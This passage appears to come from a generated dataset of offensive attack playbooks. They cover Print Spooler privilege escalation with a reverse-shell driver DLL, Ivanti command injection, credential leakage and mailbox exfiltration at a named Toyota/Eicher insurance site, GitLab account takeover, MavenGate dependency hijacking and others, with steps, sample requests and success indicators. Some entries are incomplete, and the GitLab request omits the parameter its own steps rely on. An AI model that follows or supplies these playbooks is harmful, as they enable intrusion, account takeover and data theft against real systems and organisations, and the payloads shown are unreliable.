Step 4: Trigger the execution of the malicious driver code by interacting with the Print Spooler service or attempting to print.
payloads_or_patterns: Malicious DLL acting as a printer driver (specific payload depends on desired LPE). Example: A DLL designed to create a reverse shell or execute arbitrary commands upon loading by the Print Spooler service.
tools_recommended: PowerShell: For managing printers and drivers (`Add-PrinterDriver`, `Add-Printer`), checking service status, and querying registry.
Print Management Console (printmanagement.msc): For viewing installed drivers and their properties.
Sysinternals Suite: For deeper system analysis and process monitoring (e.g., Process Monitor).
Custom C/C++ tool: To create and package a malicious printer driver.
success_indicators: Arbitrary code execution with SYSTEM privileges on the target Windows machine.
Creation of a reverse shell connected to the attacker's listener.
Modification of system files or user data as SYSTEM.
failure_indicators: Error code 740 consistently returned for all driver installations, indicating the policy is strictly enforced.
Attacks blocked by AppLocker or other security mechanisms preventing execution of unsigned drivers.
Print Spooler service not running or unavailable.

playbooks.impact: Local Privilege Escalation from a standard user to SYSTEM privileges on a Windows machine, allowing the attacker to gain complete control over the compromised host, access sensitive data, and pivot to other systems in the network.
playbooks.key_lesson: Always verify the configuration of the 'Limits print driver installation to Administrators' Group Policy and ensure that non-administrator users cannot install arbitrary printer drivers to prevent Local Privilege Escalation via the Print Spooler service.

meta.title: nix libX11: Uncovering and exploiting a 35-year-old vulnerability – Part 1 of 2

affected_components: Xlib functions related to string handling and drawing
tech_stack_fingerprints: Compilation of C code that links against libX11

trigger_conditions.when_to_apply: This vulnerability is applicable when an attacker can influence the length of a string processed by vulnerable libX11 functions, leading to an integer overflow and a potential heap buffer overflow.
prerequisites: The target system must have libX11 installed and in use.
The attacker must be able to control or influence the content of strings passed to vulnerable Xlib functions.
applicability_signals: Use of Xlib functions such as XDrawString, XDrawText, XmbDrawString, XwcDrawString, Xutf8DrawString, etc., where string length is a critical input.
Code review of libX11 or applications that directly use these Xlib functions.
skip_if: The libX11 version is patched or known to be unaffected.
Input strings are strictly validated for length by the calling application.

recon_steps: Step 1: Identify applications or libraries that directly use Xlib functions for string drawing operations. This might involve source code analysis or dynamic analysis of running X11 applications.
Step 2: Review the source code of libX11 itself, focusing on functions that handle string length calculations and memory allocations for drawing operations (e.g., XDrawString, XDrawText).
attack_steps: Step 1: Craft a malicious input string where the length calculation results in an integer overflow. For example, a string that, when its length is computed by a vulnerable function, wraps around to a small positive or negative number.
Step 2: Pass this crafted string to the vulnerable Xlib function within an application that utilizes libX11.

Step 3: Observe the application's behavior. The integer overflow in length calculation can lead to an undersized buffer allocation on the heap, followed by a heap buffer overflow when the string data is copied into this buffer.
payloads_or_patterns: Payloads would involve specially crafted strings with lengths designed to overflow `int` types during Xlib function calls. Exact payloads depend on the specific function and context, but the principle is to create a string length that, after some arithmetic operation, results in a value much smaller than the actual string content size, leading to `malloc` allocating a too-small buffer.
tools_recommended: Source code analysis tools (e.g., grep, cscope, understand)
Debuggers (e.g., gdb) for heap analysis and memory corruption detection
Fuzzing tools capable of crafting malformed string inputs
success_indicators: Application crash (segmentation fault, heap corruption detected by tools like ASan)
Observable memory corruption in allocated buffers related to string processing.
In advanced scenarios, successful exploitation might lead to arbitrary code execution if the overflow can be controlled to overwrite critical data structures like function pointers.
failure_indicators: No crash or observable memory corruption: The input string length might not be triggering the overflow, or the specific Xlib function usage is not vulnerable.
Application handles the malformed string gracefully (e.g., truncation): Indicates input validation or safer string handling in the application layer.
Response: 'insufficient detail in writeup'

playbooks.impact: Denial of Service (DoS) through application crashes due to heap corruption. In scenarios where the overflow can be precisely controlled, it could potentially lead to arbitrary code execution.
playbooks.key_lesson: When analyzing code that processes string lengths, pay close attention to potential integer overflows in length calculations, especially in functions that use these lengths to allocate memory and copy data. Ensure that allocated buffer sizes are always greater than or equal to the actual data size, even after arithmetic operations on the length.

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
 <key>Command</key>
 <string>whoami</string>
</dict>
</plist>
tools_recommended: Metasploit Framework: Use the `ivanti_connect_secure_unauth_rce` module.
curl: For manual testing and crafting requests.
success_indicators: HTTP 200 OK response for the crafted POST request.
In the response body, the output of the executed command (e.g., 'root' or a user ID) is present.
failure_indicators: HTTP 4xx or 5xx error codes indicate failure.
Response body does not contain the expected command output.
A 403 Forbidden response may indicate WAF interference or a patched system.

playbooks.impact: Remote code execution (RCE) on the Ivanti Connect Secure appliance, leading to full compromise of the device and potentially the network it protects. This can include unauthorized access, data exfiltration, and further lateral movement.
playbooks.key_lesson: Always test unauthenticated endpoints on network appliances for command injection vulnerabilities, especially when unusual XML parsing or configuration management interfaces are exposed.

meta.title: Hacking into a Toyota/Eicher Motors insurance company by exploiting their premium calculator website

affected_components: Premium calculator website API (specifically email sending functionality)
tech_stack_fingerprints: Presence of API endpoints that handle email sending via POST requests with Authorization headers.

trigger_conditions.when_to_apply: This technique is applicable when a web application uses a client-side email sending mechanism that, upon success, returns sensitive server-side logs containing credentials or other secrets.
prerequisites: Target website must have an email sending functionality exposed via an API.
The API request must contain an Authorization header, even if it's not immediately clear how to obtain a valid token.
applicability_signals: Client-side JavaScript code that attempts to send emails via an API.
API endpoints that accept email subject and body parameters.
HTTP responses from the email sending API that include server-side logs upon success or failure.
skip_if: The email sending API consistently returns 401 Unauthorized without any discernible error messages or logs.
No email sending functionality is found on the target web application.

recon_steps: Step 1: Navigate to the Toyota Tsusho Insurance Broker India premium calculator website.
Step 2: Perform a 'View Page Source' or use browser developer tools to inspect the JavaScript code for any email sending functionalities.
Step 3: Identify API endpoints used for sending emails and observe the HTTP requests made, paying attention to headers (e.g., Authorization) and parameters.
attack_steps: Step 1: Craft a POST request to the identified email sending API endpoint, providing a test subject and body. Include any observed Authorization header, even if its validity is unknown.
Step 2: Send the crafted request and analyze the HTTP response.
Step 3: If the response indicates success or returns error logs, inspect the response body for any base64 encoded strings or plaintext credentials.
Step 4: If a password is found, attempt to log in to the associated email account (e.g., noreplyeicher@ttibi.co.in) using standard email login portals.
Step 5: Upon successful login, enumerate and exfiltrate sensitive data stored in the email account.
payloads_or_patterns:
POST /send_email HTTP/1.1
Host: <TARGET_URL_OF_API>
Content-Type: application/json
Authorization: Bearer <POTENTIAL_INVALID_TOKEN_OR_NONE>

{
  "to": "test@example.com",
  "subject": "Test Subject",
  "body": "Test Body"
}
tools_recommended: Burp Suite or OWASP ZAP: To intercept and modify HTTP requests.
Base64 decoder: To decode any base64 encoded credentials found in the response.
success_indicators: HTTP response containing server-side logs that include a base64 encoded or plaintext password for an email account.
Successful login to the leaked email account.
Access to sensitive data such as customer information, insurance policy PDFs, password reset links, and OTPs within the email account.
failure_indicators: Consistent 401 Unauthorized responses without any revealing logs.
No sensitive information found in the API responses.
Successful email sending but no leaked credentials.

playbooks.impact: Gained access to a Microsoft corporate email account, leading to the disclosure of approximately 25 GB of data (657k emails) containing sensitive customer information, insurance policy documents, password reset links, and One-Time Passwords (OTPs). Provided a foothold into other Microsoft cloud resources like the corporate directory, SharePoint, and Teams.
playbooks.key_lesson: When an API endpoint performs an action like sending an email and returns verbose logs or sensitive data in its response, always scrutinize these logs for embedded credentials or secrets, especially if an Authorization header is present but its origin is unclear.

meta.title: Understanding GitLab EE/CE Account TakeOver (CVE-2023-7028)

tech_stack_fingerprints: GitLab (implied by vulnerability title and context)

trigger_conditions.when_to_apply: When targeting GitLab instances that are running vulnerable versions and where users do not have Two-Factor Authentication (2FA) enabled.
prerequisites: Target is a GitLab instance running a vulnerable version (16.1 to 16.7.1).
Victim user does not have 2FA enabled.
applicability_signals: Observed password reset functionality on a GitLab instance.
Absence of explicit mention of 2FA enforcement for password resets.
skip_if: Target is not GitLab.
GitLab instance is patched or running a non-vulnerable version.
2FA is enforced for all password reset requests.

recon_steps: Step 1: Identify if the target is a GitLab instance using standard web crawling and fingerprinting techniques.
Step 2: Attempt to access the password reset functionality for a known or guessed user email address to observe the request/response flow.
attack_steps: Step 1: Initiate a password reset request for a target user by providing their email address.

Step 2: Observe the structure of the password reset request. If it accepts an array of email addresses or has a parameter that can be manipulated to accept an attacker-controlled email, this vulnerability might be present.

Step 3: If the vulnerability is confirmed, an attacker would provide the victim's email address as an additional input during the password reset process, potentially causing the reset link to be sent to the attacker's controlled email address.
Step 4: Upon receiving the reset link, the attacker uses it to set a new password for the victim's account.
payloads_or_patterns:
POST /users/password HTTP/1.1
Host: <TARGET_URL>
Content-Type: application/x-www-form-urlencoded

utf8=%E2%9C%93&authenticity_token=...
&email=<VICTIM_EMAIL>&commit=Reset+password
tools_recommended: Burp Suite: Intercept and modify password reset requests. Fuzzing may be required to identify the exact parameter for the email array.
success_indicators: Receiving a password reset email for the victim's account at an attacker-controlled email address.
Successfully logging into the victim's account with a newly set password.
failure_indicators: Password reset emails are consistently sent only to the victim's email address.
The password reset process validates the email against an account and rejects requests for non-existent emails.
A 403 Forbidden or similar error is returned when attempting to manipulate the email parameter.

playbooks.impact: An unauthenticated attacker can take over any user's account, including high-privileged accounts, by exploiting the password reset mechanism. This allows the attacker to access all data within the account, perform actions on behalf of the user, and potentially escalate privileges within the GitLab instance.
playbooks.key_lesson: Always validate and sanitize user-supplied email addresses in password reset flows on the server-side to prevent attackers from hijacking legitimate reset processes.

meta.title: Introducing MavenGate: a supply chain attack method for Java and Android applications
meta.programs: Google, Facebook, Amazon, Microsoft, Adobe, LinkedIn, Netflix

target_profile.technology: Maven, Gradle (Java and Android build tools)
affected_components: Dependency resolution and build process in Maven/Gradle projects

trigger_conditions.when_to_apply: When a project uses dependencies from public Maven repositories and the domain associated with a `groupId` has expired and can be re-registered by an attacker.
prerequisites: The target project must use Maven or Gradle for dependency management.
The target project must rely on at least one dependency from a public Maven repository.
A known, popular, or critical dependency's `groupId` must be associated with an expired domain name that can be purchased by the attacker.
applicability_signals: The presence of dependencies declared in `pom.xml` or `build.gradle` files.
Observation of dependency declarations referencing public repositories (e.g., `mavenCentral()`).
Research indicating specific libraries with abandoned domains used in popular projects.
skip_if: Projects exclusively using private, verified repositories with strong domain validation.
Projects that have explicitly pinned dependency versions and do not allow for transitive updates.
Build systems that do not rely on Maven or Gradle.

recon_steps: Step 1: Identify target Java or Android projects that use Maven or Gradle.
Step 2: Analyze dependency declarations (`pom.xml` or `build.gradle`) for libraries sourced from public Maven repositories.
Step 3: For each `groupId` used, research the associated domain name and check its registration status and expiration date.
Step 4: Identify any `groupId` domains that are abandoned or close to expiration.
attack_steps: Step 1: Purchase the abandoned domain name associated with a target `groupId`.
Step 2: Create a malicious version of a popular or critical library under the hijacked `groupId`.
Step 3: Publish the malicious library to a public Maven repository (e.g., Maven Central).
Step 4: Wait for target projects to resolve and download the malicious dependency during their build process.
Step 5: The malicious code injected into the dependency will execute when the target application or build process runs.
payloads_or_patterns: Malicious JAR file containing arbitrary code, designed to mimic a legitimate library's functionality but with added malicious behavior.
Example: A replacement `com.example.vulnerable:library:1.0.0` dependency where `com.example.vulnerable` is the hijacked domain.
tools_recommended: Domain registration services (e.g., GoDaddy, Namecheap) to search for and purchase expired domains.
Maven/Gradle build tools to package and publish malicious dependencies.
Tools to identify abandoned libraries and their associated domains (research-driven).
success_indicators: The target application exhibits unexpected behavior, data exfiltration, or system compromise.
Network logs show connections from the target system to attacker-controlled infrastructure.
Build logs indicate the download and use of the attacker-published malicious dependency.
failure_indicators: The target project does not use dependencies from public repositories or does not resolve the attacker's published dependency.
The domain for the `groupId` is not actually abandoned or cannot be re-registered by the attacker.
The build process fails due to signature mismatches or other integrity checks.
Pivot: If dependency hijacking fails, consider attacks on build plugins or CI/CD infrastructure if those are also exposed.

playbooks.impact: Remote code execution within the build process of target applications, leading to potential compromise of build servers, source code theft, injection of further malicious code into applications, and supply chain compromise affecting millions of end-users.
playbooks.key_lesson: Actively monitor the domain registration status for `groupId`s used in critical dependencies and ensure timely renewal to prevent domain hijacking and subsequent supply chain attacks.

meta.title: Finding vulnerabilities in Swiss Post's e-voting system: part 3

trigger_conditions.when_to_apply: This playbook is for identifying potential vulnerabilities in the Swiss Post E-Voting system, specifically focusing on technical findings like those described in the writeup.
prerequisites: Access to the e-voting system's codebase or a running instance for testing.
applicability_signals: The existence of security vulnerabilities within the e-voting system's codebase.

recon_steps: Step 1: Analyze the provided writeup and any associated code snippets or commit messages to understand the reported vulnerabilities and the system's architecture.

Step 2: If specific code locations or functions are mentioned, review them for similar patterns or related vulnerabilities.
Step 3: If the writeup details specific technical flaws, attempt to reproduce the reported findings by interacting with the system or analyzing the code.
Step 4: If the writeup hints at potential attack vectors without full details, attempt to expand on those vectors by crafting specific payloads or test cases.
payloads_or_patterns: insufficient detail in writeup
tools_recommended: Source code analysis tools (e.g., SAST tools, IDEs with code navigation)
Debugger
Proxy tools (e.g., Burp Suite, OWASP ZAP) if direct interaction is possible
success_indicators: Confirmation of the specific vulnerabilities described in the writeup.
Discovery of similar or related vulnerabilities by applying the logic from the writeup.
Successful exploitation or reproduction of a described security flaw.

Analysis reveals no similar vulnerable patterns.
System's defensive mechanisms prevent exploitation.

playbooks.impact: Depending on the specific vulnerabilities found and detailed in the writeup, impacts could range from data exposure, manipulation of vote integrity, denial of service, or compromise of system components. The writeup itself does not detail the impact of the vulnerabilities it mentions.
